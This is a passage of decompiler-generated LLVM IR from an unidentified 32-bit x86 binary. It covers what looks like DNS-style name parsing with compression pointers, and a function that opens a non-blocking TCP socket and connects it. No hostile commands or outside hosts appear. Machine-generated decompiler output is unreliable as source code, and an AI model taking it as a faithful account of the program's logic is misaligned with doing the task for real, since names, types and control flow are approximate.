  br i1 %v4_804f6b827, label %dec_label_pc_804f6e9, label %dec_label_pc_804f6bc.preheader.preheader

dec_label_pc_804f6bc.preheader.preheader:         ; preds = %dec_label_pc_804f6ad
  %v1_804f6dd = add i32 %v0_804f652128, 32
  br label %dec_label_pc_804f6bc.preheader

dec_label_pc_804f6bc.preheader:                   ; preds = %dec_label_pc_804f6bc.preheader.preheader, %dec_label_pc_804f738
  %v0_804f73c = phi i32 [ %v3_804f73c, %dec_label_pc_804f738 ], [ 1, %dec_label_pc_804f6bc.preheader.preheader ]
  %v0_804f73963 = phi i32 [ %v0_804f739, %dec_label_pc_804f738 ], [ 0, %dec_label_pc_804f6bc.preheader.preheader ]
  %v0_804f6c559 = phi i32 [ %v1_804f738, %dec_label_pc_804f738 ], [ %v1_804f6a4, %dec_label_pc_804f6bc.preheader.preheader ]
  %v0_804f6bc57 = phi i32 [ %v6_804f6b6, %dec_label_pc_804f738 ], [ %v6_804f6b626, %dec_label_pc_804f6bc.preheader.preheader ]
  br label %dec_label_pc_804f6bc

dec_label_pc_804f6bc:                             ; preds = %dec_label_pc_804f6bc.preheader, %dec_label_pc_804f6c0
  %v0_804f739 = phi i32 [ %v0_804f73963, %dec_label_pc_804f6bc.preheader ], [ 1, %dec_label_pc_804f6c0 ]
  %v0_804f738 = phi i32 [ %v0_804f6c559, %dec_label_pc_804f6bc.preheader ], [ %v2_804f6e1, %dec_label_pc_804f6c0 ]
  %v4_804f6b6 = phi i32 [ %v0_804f6bc57, %dec_label_pc_804f6bc.preheader ], [ %v6_804f6e3, %dec_label_pc_804f6c0 ]
  %v1_804f6bc = trunc i32 %v4_804f6b6 to i8
  %tmp141 = icmp ult i8 %v1_804f6bc, -64
  br i1 %tmp141, label %dec_label_pc_804f738, label %dec_label_pc_804f6c0

dec_label_pc_804f6c0:                             ; preds = %dec_label_pc_804f6bc
  %v1_804f6c0 = urem i32 %v4_804f6b6, 256
  store i32 %v1_804f6c0, i32* %eax.global-to-local, align 4
  %v1_804f6c5 = add i32 %v0_804f738, 1
  %v2_804f6c5 = inttoptr i32 %v1_804f6c5 to i8*
  %v3_804f6c5 = load i8, i8* %v2_804f6c5, align 1
  %v4_804f6c5 = zext i8 %v3_804f6c5 to i32
  store i32 1, i32* %ecx.global-to-local, align 4
  %v2_804f6d3 = mul nuw nsw i32 %v1_804f6c0, 256
  %v2_804f6d6 = add nsw i32 %v2_804f6d3, -49152
  %v3_804f6d6 = or i32 %v4_804f6c5, %v2_804f6d6
  store i32 %v3_804f6d6, i32* %eax.global-to-local, align 4
  %v2_804f6e1 = add i32 %v1_804f6dd, %v3_804f6d6
  store i32 %v2_804f6e1, i32* %edx.global-to-local, align 4
  %v1_804f6e3 = inttoptr i32 %v2_804f6e1 to i8*
  %v2_804f6e3 = load i8, i8* %v1_804f6e3, align 1
  %v3_804f6e3 = zext i8 %v2_804f6e3 to i32
  %v6_804f6e3 = or i32 %v3_804f6e3, %v2_804f6d6
  store i32 %v6_804f6e3, i32* %eax.global-to-local, align 4
  %v4_804f6e5 = icmp eq i8 %v2_804f6e3, 0
  %v1_804f6e7 = icmp eq i1 %v4_804f6e5, false
  br i1 %v1_804f6e7, label %dec_label_pc_804f6bc, label %dec_label_pc_804f6e9

dec_label_pc_804f6e9:                             ; preds = %dec_label_pc_804f738, %dec_label_pc_804f6c0, %dec_label_pc_804f6ad
  %v1_804f6e9 = phi i32 [ 0, %dec_label_pc_804f6ad ], [ 1, %dec_label_pc_804f6c0 ], [ %v0_804f739, %dec_label_pc_804f738 ]
  %v0_804f6e9 = phi i32 [ 1, %dec_label_pc_804f6ad ], [ %v0_804f73c, %dec_label_pc_804f6c0 ], [ %v3_804f73c, %dec_label_pc_804f738 ]
  %v2_804f6e9 = add i32 %v0_804f6e9, %v1_804f6e9
  store i32 %v2_804f6e9, i32* @ebx, align 4
  %v2_804f6eb = add i32 %v2_804f6e9, %v1_804f6a4
  br label %dec_label_pc_804f64d.backedge

dec_label_pc_804f64d.backedge:                    ; preds = %dec_label_pc_804f6e9, %dec_label_pc_804f760
  %v0_804f64d = phi i32 [ %v0_804f652128, %dec_label_pc_804f6e9 ], [ %v0_804f64d.pre, %dec_label_pc_804f760 ]
  %storemerge = phi i32 [ %v2_804f6eb, %dec_label_pc_804f6e9 ], [ %v2_804f76b, %dec_label_pc_804f760 ]
  store i32 %storemerge, i32* %ecx.global-to-local, align 4
  %v1_804f64d = add i32 %v0_804f64d, 22
  %v2_804f64d = inttoptr i32 %v1_804f64d to i16*
  %v3_804f64d = load i16, i16* %v2_804f64d, align 2
  %v4_804f64d = add i16 %v3_804f64d, -1
  store i16 %v4_804f64d, i16* %v2_804f64d, align 2
  %v0_804f652 = load i32, i32* @esp, align 4
  %v1_804f652 = add i32 %v0_804f652, 22
  %v2_804f652 = inttoptr i32 %v1_804f652 to i16*
  %v3_804f652 = load i16, i16* %v2_804f652, align 2
  %v13_804f652 = icmp eq i16 %v3_804f652, -1
  br i1 %v13_804f652, label %dec_label_pc_804f5e4, label %dec_label_pc_804f65a

dec_label_pc_804f6f3:                             ; preds = %dec_label_pc_804f5e4
  %v1_804f6f3 = add i32 %v2_804f5f0, 4
  %v2_804f6f3 = inttoptr i32 %v1_804f6f3 to i32*
  %v3_804f6f3 = load i32, i32* %v2_804f6f3, align 4
  store i32 %v3_804f6f3, i32* %eax.global-to-local, align 4
  %v1_804f6f6 = icmp eq i32 %v3_804f6f3, 0
  br i1 %v1_804f6f6, label %dec_label_pc_804f706, label %dec_label_pc_804f6fa

dec_label_pc_804f6fa:                             ; preds = %dec_label_pc_804f6f3
  %v3_804f6fd = inttoptr i32 %v0_804f5ed to i32*
  store i32 %v3_804f6f3, i32* %v3_804f6fd, align 4
  %v1_804f6fe = call i32 @function_8053949(i32 1)
  store i32 %v1_804f6fe, i32* %eax.global-to-local, align 4
  %v0_804f703 = load i32, i32* @esp, align 4
  %v1_804f703 = add i32 %v0_804f703, 16
  br label %dec_label_pc_804f706

dec_label_pc_804f706:                             ; preds = %dec_label_pc_804f6f3, %dec_label_pc_804f6fa
  %v0_804f706 = phi i32 [ %v1_804f5ed, %dec_label_pc_804f6f3 ], [ %v1_804f703, %dec_label_pc_804f6fa ]
  %v2_804f709 = inttoptr i32 %v0_804f706 to i32*
  %v3_804f709 = load i32, i32* %v2_804f709, align 4
  store i32 %v3_804f709, i32* @esi, align 4
  %v2_804f70d = add i32 %v0_804f706, -16
  %v3_804f70d = inttoptr i32 %v2_804f70d to i32*
  store i32 %v3_804f709, i32* %v3_804f70d, align 4
  %v1_804f70e = call i32 @function_8053949(i32 1)
  store i32 %v1_804f70e, i32* %eax.global-to-local, align 4
  %v0_804f713 = load i32, i32* @esp, align 4
  %v1_804f713 = add i32 %v0_804f713, 16
  %v2_804f713 = inttoptr i32 %v1_804f713 to i32*
  store i32 0, i32* %v2_804f713, align 4
  %v0_804f71b = load i32, i32* @esp, align 4
  %v1_804f71b = add i32 %v0_804f71b, 16
  %v1_804f71e = inttoptr i32 %v1_804f71b to i32*
  %v2_804f71e = load i32, i32* %v1_804f71e, align 4
  store i32 %v2_804f71e, i32* %eax.global-to-local, align 4
  %v1_804f721 = add i32 %v0_804f71b, 4300
  %v1_804f727 = inttoptr i32 %v1_804f721 to i32*
  %v2_804f727 = load i32, i32* %v1_804f727, align 4
  store i32 %v2_804f727, i32* @ebx, align 4
  %v3_804f728 = add i32 %v0_804f71b, 4308
  %v1_804f729 = inttoptr i32 %v3_804f728 to i32*
  %v2_804f729 = load i32, i32* %v1_804f729, align 4
  store i32 %v2_804f729, i32* @edi, align 4
  %v3_804f729 = add i32 %v0_804f71b, 4312
  %v1_804f72a = inttoptr i32 %v3_804f729 to i32*
  %v2_804f72a = load i32, i32* %v1_804f72a, align 4
  store i32 %v2_804f72a, i32* @ebp, align 4
  ret i32 %v2_804f71e

dec_label_pc_804f72c:                             ; preds = %dec_label_pc_804f669
  %v1_804f72c = add i32 %v0_804f72c, 1
  store i32 %v1_804f72c, i32* %edx.global-to-local, align 4
  %v5_804f72d = icmp eq i32 %v0_804f72d, 0
  %v2_804f730 = zext i1 %v5_804f72d to i32
  %v3_804f730 = add i32 %v2_804f730, %v0_804f730
  %v1_804f663 = inttoptr i32 %v1_804f72c to i8*
  %v2_804f663 = load i8, i8* %v1_804f663, align 1
  %v3_804f663 = zext i8 %v2_804f663 to i32
  %v5_804f663 = and i32 %v4_804f663, -256
  %v6_804f663 = or i32 %v3_804f663, %v5_804f663
  store i32 %v6_804f663, i32* %eax.global-to-local, align 4
  %v4_804f665 = icmp eq i8 %v2_804f663, 0
  br i1 %v4_804f665, label %dec_label_pc_804f69a, label %dec_label_pc_804f669.preheader

dec_label_pc_804f738:                             ; preds = %dec_label_pc_804f6bc
  %v1_804f738 = add i32 %v0_804f738, 1
  store i32 %v1_804f738, i32* %edx.global-to-local, align 4
  %v5_804f739 = icmp eq i32 %v0_804f739, 0
  %v2_804f73c = zext i1 %v5_804f739 to i32
  %v3_804f73c = add i32 %v2_804f73c, %v0_804f73c
  %v1_804f6b6 = inttoptr i32 %v1_804f738 to i8*
  %v2_804f6b6 = load i8, i8* %v1_804f6b6, align 1
  %v3_804f6b6 = zext i8 %v2_804f6b6 to i32
  %v5_804f6b6 = and i32 %v4_804f6b6, -256
  %v6_804f6b6 = or i32 %v3_804f6b6, %v5_804f6b6
  store i32 %v6_804f6b6, i32* %eax.global-to-local, align 4
  %v4_804f6b8 = icmp eq i8 %v2_804f6b6, 0
  br i1 %v4_804f6b8, label %dec_label_pc_804f6e9, label %dec_label_pc_804f6bc.preheader

dec_label_pc_804f744:                             ; preds = %dec_label_pc_804f69a
  %v1_804f744 = add i32 %v2_804f69c, 2
  %v2_804f744 = inttoptr i32 %v1_804f744 to i16*
  %v3_804f744 = load i16, i16* %v2_804f744, align 2
  %v9_804f744 = icmp eq i16 %v3_804f744, 256
  %v1_804f74a = icmp eq i1 %v9_804f744, false
  br i1 %v1_804f74a, label %dec_label_pc_804f6ad, label %dec_label_pc_804f750

dec_label_pc_804f750:                             ; preds = %dec_label_pc_804f744
  %v1_804f750 = add i32 %v2_804f69c, 8
  %v2_804f750 = inttoptr i32 %v1_804f750 to i16*
  %v3_804f750 = load i16, i16* %v2_804f750, align 2
  %v4_804f750 = zext i16 %v3_804f750 to i32
  %v6_804f750 = and i32 %v5_804f750, -65536
  %v7_804f750 = or i32 %v4_804f750, %v6_804f750
  store i32 %v7_804f750, i32* %edx.global-to-local, align 4
  %v2_804f756 = call i16 @llvm.bswap.i16(i16 %v3_804f750)
  %v3_804f756 = zext i16 %v2_804f756 to i32
  %v6_804f756 = or i32 %v3_804f756, %v6_804f750
  store i32 %v6_804f756, i32* %eax.global-to-local, align 4
  %v10_804f75a = icmp eq i16 %v3_804f750, 1024
  br i1 %v10_804f75a, label %dec_label_pc_804f773, label %dec_label_pc_804f760

dec_label_pc_804f760:                             ; preds = %dec_label_pc_804f750, %dec_label_pc_804f773
  %v0_804f64d.pre = phi i32 [ %v0_804f652128, %dec_label_pc_804f750 ], [ %v0_804f64d.pre.pre, %dec_label_pc_804f773 ]
  %v0_804f76b = phi i32 [ %v1_804f6a4, %dec_label_pc_804f750 ], [ %v0_804f76b.pre, %dec_label_pc_804f773 ]
  %v0_804f760 = phi i32 [ %v7_804f750, %dec_label_pc_804f750 ], [ %v7_804f7d7, %dec_label_pc_804f773 ]
  %v1_804f760 = trunc i32 %v0_804f760 to i16
  %v2_804f760 = call i16 @llvm.bswap.i16(i16 %v1_804f760)
  %v3_804f760 = zext i16 %v2_804f760 to i32
  %v5_804f760 = and i32 %v0_804f760, -65536
  %v6_804f760 = or i32 %v3_804f760, %v5_804f760
  store i32 %v6_804f760, i32* %edx.global-to-local, align 4
  store i32 %v3_804f760, i32* %eax.global-to-local, align 4
  %v2_804f76b = add i32 %v3_804f760, %v0_804f76b
  br label %dec_label_pc_804f64d.backedge

dec_label_pc_804f773:                             ; preds = %dec_label_pc_804f750
  %v2_804f773 = inttoptr i32 %v1_804f6a4 to i8*
  %v3_804f773 = load i8, i8* %v2_804f773, align 1
  %v4_804f773 = zext i8 %v3_804f773 to i32
  %v6_804f773 = and i32 %v6_804f756, -256
  %v7_804f773 = or i32 %v4_804f773, %v6_804f773
  store i32 %v7_804f773, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v3_804f778 = add i32 %v0_804f652128, 4280
  %v4_804f778 = inttoptr i32 %v3_804f778 to i8*
  store i8 %v3_804f773, i8* %v4_804f778, align 1
  %v0_804f77f = load i32, i32* @edi, align 4
  %v1_804f77f = add i32 %v0_804f77f, 1
  %v2_804f77f = inttoptr i32 %v1_804f77f to i8*
  %v3_804f77f = load i8, i8* %v2_804f77f, align 1
  %v4_804f77f = zext i8 %v3_804f77f to i32
  %v5_804f77f = load i32, i32* %eax.global-to-local, align 4
  %v6_804f77f = and i32 %v5_804f77f, -256
  %v7_804f77f = or i32 %v6_804f77f, %v4_804f77f
  store i32 %v7_804f77f, i32* %eax.global-to-local, align 4
  %v2_804f782 = load i32, i32* @esp, align 4
  %v3_804f782 = add i32 %v2_804f782, 4281
  %v4_804f782 = inttoptr i32 %v3_804f782 to i8*
  store i8 %v3_804f77f, i8* %v4_804f782, align 1
  %v0_804f789 = load i32, i32* @edi, align 4
  %v1_804f789 = add i32 %v0_804f789, 2
  %v2_804f789 = inttoptr i32 %v1_804f789 to i8*
  %v3_804f789 = load i8, i8* %v2_804f789, align 1
  %v4_804f789 = zext i8 %v3_804f789 to i32
  %v5_804f789 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f789 = and i32 %v5_804f789, -256
  %v7_804f789 = or i32 %v6_804f789, %v4_804f789
  store i32 %v7_804f789, i32* %eax.global-to-local, align 4
  %v2_804f78c = load i32, i32* @esp, align 4
  %v3_804f78c = add i32 %v2_804f78c, 4282
  %v4_804f78c = inttoptr i32 %v3_804f78c to i8*
  store i8 %v3_804f789, i8* %v4_804f78c, align 1
  %v0_804f793 = load i32, i32* @edi, align 4
  %v1_804f793 = add i32 %v0_804f793, 3
  %v2_804f793 = inttoptr i32 %v1_804f793 to i8*
  %v3_804f793 = load i8, i8* %v2_804f793, align 1
  %v4_804f793 = zext i8 %v3_804f793 to i32
  %v5_804f793 = load i32, i32* %eax.global-to-local, align 4
  %v6_804f793 = and i32 %v5_804f793, -256
  %v7_804f793 = or i32 %v6_804f793, %v4_804f793
  store i32 %v7_804f793, i32* %eax.global-to-local, align 4
  %v2_804f796 = load i32, i32* @esp, align 4
  %v3_804f796 = add i32 %v2_804f796, 4283
  %v4_804f796 = inttoptr i32 %v3_804f796 to i8*
  store i8 %v3_804f793, i8* %v4_804f796, align 1
  %v0_804f79d = load i32, i32* %eax.global-to-local, align 4
  %v1_804f79d = load i32, i32* @esp, align 4
  %v2_804f79d = add i32 %v1_804f79d, -4
  %v3_804f79d = inttoptr i32 %v2_804f79d to i32*
  store i32 %v0_804f79d, i32* %v3_804f79d, align 4
  %v0_804f79e = load i32, i32* %eax.global-to-local, align 4
  %v2_804f79e = add i32 %v1_804f79d, -8
  %v3_804f79e = inttoptr i32 %v2_804f79e to i32*
  store i32 %v0_804f79e, i32* %v3_804f79e, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804f7a1 = inttoptr i32 %v1_804f79d to i32*
  %v3_804f7a1 = load i32, i32* %v2_804f7a1, align 4
  store i32 %v3_804f7a1, i32* @edx, align 4
  %v1_804f7a5 = inttoptr i32 %v3_804f7a1 to i8*
  %v2_804f7a5 = load i8, i8* %v1_804f7a5, align 1
  %v3_804f7a5 = zext i8 %v2_804f7a5 to i32
  %v1_804f7a7 = mul nuw nsw i32 %v3_804f7a5, 4
  %v2_804f7a7 = add nuw nsw i32 %v1_804f7a7, 4
  store i32 %v2_804f7a7, i32* %eax.global-to-local, align 4
  %v2_804f7ae = add i32 %v1_804f79d, -12
  %v3_804f7ae = inttoptr i32 %v2_804f7ae to i32*
  store i32 %v2_804f7a7, i32* %v3_804f7ae, align 4
  %v0_804f7af = load i32, i32* @edx, align 4
  %v1_804f7af = add i32 %v0_804f7af, 4
  %v2_804f7af = inttoptr i32 %v1_804f7af to i32*
  %v3_804f7af = load i32, i32* %v2_804f7af, align 4
  store i32 %v3_804f7af, i32* %eax.global-to-local, align 4
  %v2_804f7b2 = add i32 %v1_804f79d, -16
  %v3_804f7b2 = inttoptr i32 %v2_804f7b2 to i32*
  store i32 %v3_804f7af, i32* %v3_804f7b2, align 4
  %v0_804f7b3 = call i32 @function_80533ec()
  store i32 %v0_804f7b3, i32* %eax.global-to-local, align 4
  %v0_804f7b8 = load i32, i32* @esp, align 4
  %v1_804f7b8 = add i32 %v0_804f7b8, 16
  %v2_804f7b8 = inttoptr i32 %v1_804f7b8 to i32*
  %v3_804f7b8 = load i32, i32* %v2_804f7b8, align 4
  store i32 %v3_804f7b8, i32* %ecx.global-to-local, align 4
  %v1_804f7bc = inttoptr i32 %v3_804f7b8 to i8*
  %v2_804f7bc = load i8, i8* %v1_804f7bc, align 1
  %v3_804f7bc = zext i8 %v2_804f7bc to i32
  %v4_804f7bc = load i32, i32* @edx, align 4
  %v5_804f7bc = and i32 %v4_804f7bc, -256
  %v6_804f7bc = or i32 %v5_804f7bc, %v3_804f7bc
  store i32 %v6_804f7bc, i32* %edx.global-to-local, align 4
  %v2_804f7be = add i32 %v3_804f7b8, 4
  %v3_804f7be = inttoptr i32 %v2_804f7be to i32*
  store i32 %v0_804f7b3, i32* %v3_804f7be, align 4
  %v0_804f7c1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7c1 = urem i32 %v0_804f7c1, 256
  %v2_804f7c1 = load i32, i32* @ebx, align 4
  %v3_804f7c1 = and i32 %v2_804f7c1, -256
  %v4_804f7c1 = or i32 %v3_804f7c1, %v1_804f7c1
  store i32 %v4_804f7c1, i32* @ebx, align 4
  %v0_804f7c3 = load i32, i32* @esp, align 4
  %v1_804f7c3 = add i32 %v0_804f7c3, 4296
  %v2_804f7c3 = inttoptr i32 %v1_804f7c3 to i32*
  %v3_804f7c3 = load i32, i32* %v2_804f7c3, align 4
  store i32 %v3_804f7c3, i32* %ecx.global-to-local, align 4
  %v1_804f7ca = add i32 %v0_804f7c1, 1
  store i32 %v1_804f7ca, i32* %edx.global-to-local, align 4
  %v3_804f7cb = mul i32 %v4_804f7c1, 4
  %v4_804f7cb = add i32 %v3_804f7cb, %v0_804f7b3
  %v5_804f7cb = inttoptr i32 %v4_804f7cb to i32*
  store i32 %v3_804f7c3, i32* %v5_804f7cb, align 4
  %v0_804f7ce = load i32, i32* @esp, align 4
  %v1_804f7ce = add i32 %v0_804f7ce, 16
  %v2_804f7ce = inttoptr i32 %v1_804f7ce to i32*
  %v3_804f7ce = load i32, i32* %v2_804f7ce, align 4
  store i32 %v3_804f7ce, i32* %eax.global-to-local, align 4
  %v0_804f7d5 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f7d5 = trunc i32 %v0_804f7d5 to i8
  %v3_804f7d5 = inttoptr i32 %v3_804f7ce to i8*
  store i8 %v1_804f7d5, i8* %v3_804f7d5, align 1
  %v0_804f7d7 = load i32, i32* @esi, align 4
  %v1_804f7d7 = add i32 %v0_804f7d7, 8
  %v2_804f7d7 = inttoptr i32 %v1_804f7d7 to i16*
  %v3_804f7d7 = load i16, i16* %v2_804f7d7, align 2
  %v4_804f7d7 = zext i16 %v3_804f7d7 to i32
  %v5_804f7d7 = load i32, i32* %edx.global-to-local, align 4
  %v6_804f7d7 = and i32 %v5_804f7d7, -65536
  %v7_804f7d7 = or i32 %v6_804f7d7, %v4_804f7d7
  store i32 %v7_804f7d7, i32* %edx.global-to-local, align 4
  %v0_804f76b.pre = load i32, i32* @edi, align 4
  %v0_804f64d.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f760

; uselistorder directives
  uselistorder i32 %v7_804f7d7, { 1, 0 }
  uselistorder i32 %v0_804f7c1, { 1, 0 }
  uselistorder i32 %v3_804f760, { 0, 2, 1 }
  uselistorder i32 %v0_804f760, { 1, 0 }
  uselistorder i32 %v6_804f6b6, { 1, 0 }
  uselistorder i32 %v3_804f73c, { 1, 0 }
  uselistorder i32 %v1_804f738, { 1, 2, 0 }
  uselistorder i32 %v6_804f663, { 2, 1, 0 }
  uselistorder i32 %v3_804f730, { 1, 0 }
  uselistorder i32 %v1_804f72c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804f706, { 1, 0 }
  uselistorder i32 %v0_804f652, { 2, 1, 0 }
  uselistorder i32 %v6_804f6e3, { 1, 0 }
  uselistorder i32 %v2_804f6e1, { 1, 2, 0 }
  uselistorder i32 %v3_804f6d6, { 1, 0 }
  uselistorder i32 %v4_804f6b6, { 1, 0, 2 }
  uselistorder i32 %v0_804f739, { 2, 0, 1 }
  uselistorder i32 %v0_804f73c, { 1, 0 }
  uselistorder i32 %v1_804f6a4, { 5, 4, 1, 0, 2, 3, 6 }
  uselistorder i32 %v6_804f694, { 0, 2, 1 }
  uselistorder i32 %v2_804f692, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804f687, { 1, 0 }
  uselistorder i32 %v4_804f663, { 1, 0, 2 }
  uselistorder i32 %v0_804f72d, { 2, 0, 1 }
  uselistorder i32 %v0_804f730, { 1, 0 }
  uselistorder i32 %v6_804f66317, { 1, 0, 2 }
  uselistorder i32 %v0_804f65a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804f652128, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_804f652123, { 0, 2, 1 }
  uselistorder i32 %v1_804f623, { 1, 0 }
  uselistorder i32 %v0_804f61f, { 0, 1, 2, 4, 5, 3 }
  uselistorder i32 %v2_804f61a, { 1, 0, 2 }
  uselistorder i32 %v0_804f5ed, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v3_804f5ae, { 1, 0 }
  uselistorder i32 %v0_804f55f, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 %v0_804f55a, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804f527, { 1, 0 }
  uselistorder i32 %v2_804f524, { 1, 0 }
  uselistorder i32 %v0_804f520, { 1, 0 }
  uselistorder i32 %v1_804f50d, { 2, 0, 1, 3 }
  uselistorder i32 %v12_804f501, { 1, 0 }
  uselistorder i32 %v0_804f4fe, { 2, 0, 1 }
  uselistorder i32 %v0_804f4e9, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804f4c7, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i32 %v0_804f4a8, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v3_804f4a3, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804f488, { 1, 0 }
  uselistorder i32 %v2_804f40f, { 1, 0 }
  uselistorder i32 %v1_804f401, { 1, 0 }
  uselistorder i32 %v1_804f3a3, { 1, 0 }
  uselistorder i8 %v2_804f392, { 2, 0, 3, 1 }
  uselistorder i32 %v0_804f38c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804f360, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 24, 28, 17, 18, 19, 20, 21, 22, 23, 0, 25, 26, 27, 60, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i16 -1, { 2, 3, 0, 1 }
  uselistorder i32 4312, { 1, 0 }
  uselistorder i32 4308, { 1, 0 }
  uselistorder i32 4300, { 1, 0 }
  uselistorder i32 (i32)* @function_8053da0, { 6, 0, 2, 5, 4, 3, 1 }
  uselistorder i32 (i8*)* @function_8051c50, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 24, 25, 26, 27, 21, 22, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 68, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 69, 70, 0, 71, 72, 73 }
  uselistorder label %dec_label_pc_804f760, { 1, 0 }
  uselistorder label %dec_label_pc_804f706, { 1, 0 }
  uselistorder label %dec_label_pc_804f64d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804f6bc, { 1, 0 }
  uselistorder label %dec_label_pc_804f6bc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f669, { 1, 0 }
  uselistorder label %dec_label_pc_804f669.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804f65a, { 1, 0 }
  uselistorder label %dec_label_pc_804f5e4, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804f49c, { 1, 0 }
  uselistorder label %dec_label_pc_804f392, { 1, 0 }
}

define i32 @function_804f800() local_unnamed_addr {
dec_label_pc_804f800:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804f800 = load i32, i32* @ebx, align 4
  %v0_804f801 = load i32, i32* @eax, align 4
  store i32 %v0_804f801, i32* @ebx, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804f826 = add i32 %v0_804f801, 4
  %v2_804f826 = inttoptr i32 %v1_804f826 to i32*
  %v3_804f826 = load i32, i32* %v2_804f826, align 4
  %v10_804f829 = icmp eq i32 %v3_804f826, -1
  br i1 %v10_804f829, label %dec_label_pc_804f800.dec_label_pc_804f83a_crit_edge, label %dec_label_pc_804f82e

dec_label_pc_804f800.dec_label_pc_804f83a_crit_edge: ; preds = %dec_label_pc_804f800
  br label %dec_label_pc_804f83a

dec_label_pc_804f82e:                             ; preds = %dec_label_pc_804f800
  %v1_804f832 = call i32 @function_80521f1(i32 %v3_804f826)
  br label %dec_label_pc_804f83a

dec_label_pc_804f83a:                             ; preds = %dec_label_pc_804f800.dec_label_pc_804f83a_crit_edge, %dec_label_pc_804f82e
  %v3_804f841 = call i32 @function_80529e5(i32 2, i32 1, i32 0)
  %v1_804f849 = load i32, i32* @ebx, align 4
  %v2_804f849 = add i32 %v1_804f849, 4
  %v3_804f849 = inttoptr i32 %v2_804f849 to i32*
  store i32 %v3_804f841, i32* %v3_804f849, align 4
  %v8_804f84c = icmp eq i32 %v3_804f841, -1
  br i1 %v8_804f84c, label %dec_label_pc_804f83a.dec_label_pc_804f8c3_crit_edge, label %dec_label_pc_804f84f

dec_label_pc_804f83a.dec_label_pc_804f8c3_crit_edge: ; preds = %dec_label_pc_804f83a
  br label %dec_label_pc_804f8c3

dec_label_pc_804f84f:                             ; preds = %dec_label_pc_804f83a
  %v0_804f851 = load i32, i32* @ebx, align 4
  %v1_804f851 = add i32 %v0_804f851, 28
  store i32 %v1_804f851, i32* @eax, align 4
  %v1_804f859 = add i32 %v0_804f851, 24
  %v2_804f859 = inttoptr i32 %v1_804f859 to i32*
  store i32 0, i32* %v2_804f859, align 4
  %v0_804f860 = load i32, i32* @eax, align 4
  %v2_804f861 = call i32 @function_8051ce0(i32 %v0_804f860, i32 256)
  %v0_804f869 = load i32, i32* @ebx, align 4
  %v1_804f869 = add i32 %v0_804f869, 4
  %v2_804f869 = inttoptr i32 %v1_804f869 to i32*
  %v3_804f869 = load i32, i32* %v2_804f869, align 4
  %v3_804f871 = call i32 @function_805212d(i32 %v3_804f869, i32 3, i32 0)
  %v0_804f879 = load i32, i32* @ebx, align 4
  %v1_804f879 = add i32 %v0_804f879, 4
  %v2_804f879 = inttoptr i32 %v1_804f879 to i32*
  %v3_804f879 = load i32, i32* %v2_804f879, align 4
  %v12_804f87c = or i32 %v3_804f871, 2048
  %v3_804f883 = call i32 @function_805212d(i32 %v3_804f879, i32 4, i32 %v12_804f87c)
  %v0_804f888 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804f89e = load i32, i32* @global_var_8056930.34, align 16
  %v2_804f8a3 = add i32 %v0_804f888, 8
  %v3_804f8a3 = inttoptr i32 %v2_804f8a3 to i32*
  store i32 %v0_804f89e, i32* %v3_804f8a3, align 4
  %v2_804f8a6 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804f8ad = load i32, i32* @ebx, align 4
  %v1_804f8ad = add i32 %v0_804f8ad, 4
  %v2_804f8ad = inttoptr i32 %v1_804f8ad to i32*
  %v3_804f8ad = load i32, i32* %v2_804f8ad, align 4
  store i32 %v3_804f8ad, i32* %edx.global-to-local, align 4
  %v1_804f8b0 = add i32 %v0_804f8ad, 12
  %v2_804f8b0 = inttoptr i32 %v1_804f8b0 to i32*
  store i32 1, i32* %v2_804f8b0, align 4
  %v0_804f8ba = load i32, i32* %edx.global-to-local, align 4
  %v3_804f8bb = call i32 @function_805280a(i32 %v0_804f8ba, i32 %v2_804f8a6, i32 16)
  br label %dec_label_pc_804f8c3

dec_label_pc_804f8c3:                             ; preds = %dec_label_pc_804f83a.dec_label_pc_804f8c3_crit_edge, %dec_label_pc_804f84f
  %v0_804f8c7 = phi i32 [ 0, %dec_label_pc_804f83a.dec_label_pc_804f8c3_crit_edge ], [ %v3_804f8bb, %dec_label_pc_804f84f ]
